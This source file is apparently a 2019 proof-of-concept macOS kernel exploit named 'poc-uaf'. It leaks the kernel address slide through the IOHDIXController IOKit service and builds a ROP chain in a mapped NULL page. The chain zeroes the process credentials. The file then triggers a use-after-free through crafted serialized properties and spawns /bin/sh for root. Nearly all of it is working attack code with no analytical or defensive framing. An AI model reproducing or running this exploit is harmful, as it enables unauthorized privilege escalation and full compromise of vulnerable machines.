//
//  main.m
//  poc-uaf
//
//  Created by test on 19/5/27.
//  Copyright © 2019年 poc-uaf. All rights reserved.
//

#include <IOKit/IOKitLib.h>
#include <IOKit/iokitmig.h>
#include <mach/mach.h>
#include <stdio.h>
uint64_t aslr(){

    printf("getting kslide...\n");
    kern_return_t err,kr;
    io_iterator_t iterator;
    static mach_port_t service = 0;
    io_connect_t cnn = 0;
  
    io_iterator_t iter;
    uint32_t data[] = {
        0x000000d3,//magic
        0x81000001,//dir
        0x08000004, 0x006e696d,//key min
        0x84000200,//number
        0x41414141, 0x41414141
    };
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHDIXController"), &iterator);
    service = IOIteratorNext(iterator);
    kr = io_service_open_extended(service, mach_task_self(), 0, NDR_record, (char*)data, sizeof(data), &err, &cnn);
    if (kr!=0)
    {
        printf("Cannot create service.\n");
        return 0;
    }
    IORegistryEntryCreateIterator(service, "IOService", kIORegistryIterateRecursively, &iter);
    io_object_t object = IOIteratorNext(iter);
    char search_str[100] = {0};
    sprintf(search_str, "pid %d", getpid());
    char buffer[0x200] = {0};
    while (object != 0)
    {
        uint32_t size = sizeof(buffer);
        if (IORegistryEntryGetProperty(object, "IOUserClientCreator", buffer, &size) == 0)
        {
            if (strstr(buffer, search_str) != NULL)
            {
                memset(buffer,0, 0x200);
                size=0x300;
                
                if (io_registry_entry_get_property_bytes(object, "min", buffer, &size)==0)
                {
                    uint64_t kslide ;
                    kslide = *((unsigned long long*)&buffer[56])-0x15ebff;
                 
                    return kslide;
                }
            }
        }
        IOObjectRelease(object);
        object = IOIteratorNext(iter);
    }
    if (object!=0)
        IOObjectRelease(object);
    
    

    return 0;
}

int makerop(uint64_t ksilde){
    ksilde-=0x100000;
    uint64_t base=ksilde-0xffffff8000100000;
    vm_map_t pay=0x10000000;
    size_t size=0x100;
   // vm_deallocate(mach_task_self(),0,size);
    kern_return_t kr = vm_allocate(mach_task_self(), &pay, size, 0);
    
    if (kr != KERN_SUCCESS) {
        printf("error: could not allocate NULL page for payload\n");
        return -1;
    }
    else{
        printf("%x\n",pay);
    }
    printf("%llx",base);
    uint64_t *p;
    p=(uint64_t *)pay;
    p[0]=0xffffff800028869f+base;
    p[1]=0xaa;
    p[2]=0xaa;
    p[3]=0xffffff800028869f+base;
    p[4]=0xffffff800026306f+base;
    p[5]=0xaa;
    
    
    
    
    
    uint64_t currproc=0xffffff800080cbe0;
    uint64_t ucred=   0xffffff800077e010;
    uint64_t cred_get=0xffffff8000751de0;
    uint64_t bzero=   0xffffff800010e140;
    uint64_t thread=  0xffffff800039923a;

    uint64_t pushrax=  0xffffff80003897b6;//push rax;add ecx,ebp;ret
    uint64_t poprdi =  0xffffff800075c99b;//xchg eax,ecx pop ret
    
    uint64_t poprsi=   0xffffff8000447cba;
    
    p[6]=currproc+base;
    p[7]=pushrax+base;
    p[8]=poprdi+base;
    
    
    p[9]=ucred+base;
    p[10]=pushrax+base;
    p[11]=poprdi+base;
    
    
    p[12]=cred_get+base;
    p[13]=pushrax+base;
    p[14]=poprdi+base;

    p[15]=poprsi+base;
   
    p[16]=sizeof(int)*3;
    
    
    p[17]=bzero+base;
    
    p[18]=thread+base;
    
    uint64_t* d=(uint64_t*)pay;
    for(int i=0;i<18;i++)
        printf("0x%llx\n",*(d+i));
    char a[10];
    gets(a);
    return 0;
}


int pwn(){
    
    

    
    
    uint32_t data[] = {
        0x000000d3,//magic
        0x81000010,//dir0
        0x08000004, 0x00000061,//key a1
        0x04000020,0x41414141, 0x41414141,//number2
        0x08000004, 0x00000062,//key a3
        0x04000020,0x41414141, 0x41414141,//number4
    
        0x0c000001,//
        0x0b000001,//8
        
        0x0c000003,//9
        0x0b000001,//10
        
    
        
        0x0c000001,//13
        0x0a000028,//14
        
        0x10000000, 0x00000000,0x00000003, 0x00000000,
        0x00000000, 0x00000000,0x00000000, 0x00000000,
        0x00000000, 0x00000000,
        0x0c000001, 0x8c000002
        };

    
    kern_return_t err,kr;
    io_iterator_t iterator;
    static mach_port_t service = 0;
   
    
        IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHDIXController"), &iterator);
    service = IOIteratorNext(iterator);
    kr = io_registry_entry_set_properties(service,(char*) data, sizeof(data), &err);
    
    
    
    
    return 0;
}

int main()
{
    uint64_t   ksilde;
    ksilde=aslr();
       printf("kslide=0x%llx\n",ksilde);
    
    if(ksilde==-1)
        return -1;
    
    
    makerop(ksilde);
    pwn();
    
    system("/bin/sh");
    printf("error: could not exec shell\n");

    
}
